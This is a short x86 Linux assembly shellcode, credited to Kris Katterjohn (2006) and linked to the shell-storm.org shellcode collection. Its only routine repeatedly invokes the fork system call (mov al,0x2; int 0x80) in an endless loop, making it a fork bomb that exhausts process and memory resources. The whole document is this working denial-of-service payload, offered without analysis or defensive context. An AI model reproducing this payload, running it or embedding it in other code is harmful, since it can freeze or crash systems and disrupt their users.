;/ By Kris Katterjohn 8/29/2006
;http://shell-storm.org/shellcode/files/shellcode-214.php 
  section .text
 
       global _start
 
  _start:
      	mov al,0x2
       int 0x80
       jmp short _start
 

